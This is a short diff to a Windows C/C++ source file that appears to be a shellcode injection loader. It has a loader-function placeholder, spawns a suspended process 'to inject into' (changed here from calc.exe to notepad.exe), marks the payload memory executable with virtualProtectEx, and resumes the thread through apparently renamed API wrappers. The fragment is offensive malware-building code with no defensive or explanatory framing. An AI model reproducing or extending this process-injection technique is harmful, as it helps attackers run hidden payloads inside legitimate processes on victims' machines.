@@ -46,7 +46,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     <LOAD_FUNCTIONS>
 
 	// Spawn process to inject into
-	createProcessA(NULL, (LPSTR)"calc.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	createProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 	
 
 	//CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
@@ -79,7 +79,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
 	virtualProtectEx(ph, payloadPtr, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);
 
-	ResumeThread(th);
+	resumeThread(th);
 
 	return 0;
 }
